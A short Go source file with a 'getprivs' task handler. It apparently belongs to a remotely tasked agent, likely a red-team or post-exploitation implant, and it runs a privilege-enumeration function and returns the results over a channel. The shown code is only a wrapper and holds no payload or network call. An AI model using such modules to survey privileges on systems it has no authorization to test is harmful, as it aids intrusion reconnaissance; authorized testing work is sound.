package getprivs

import (
	"strings"

	"pkg/utils/structs"
)

//Run - Function that executes the shell command
func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
	tMsg := structs.ThreadMsg{}
	res, err := getprivs()

	tMsg.TaskItem = task
	if err != nil {
		tMsg.TaskResult = []byte(err.Error())
		tMsg.Error = true
		threadChannel <- tMsg
		return
	}

	tMsg.TaskResult = []byte(strings.Join(res, "\n"))
	tMsg.Error = false
	tMsg.Completed = true
	threadChannel <- tMsg
}
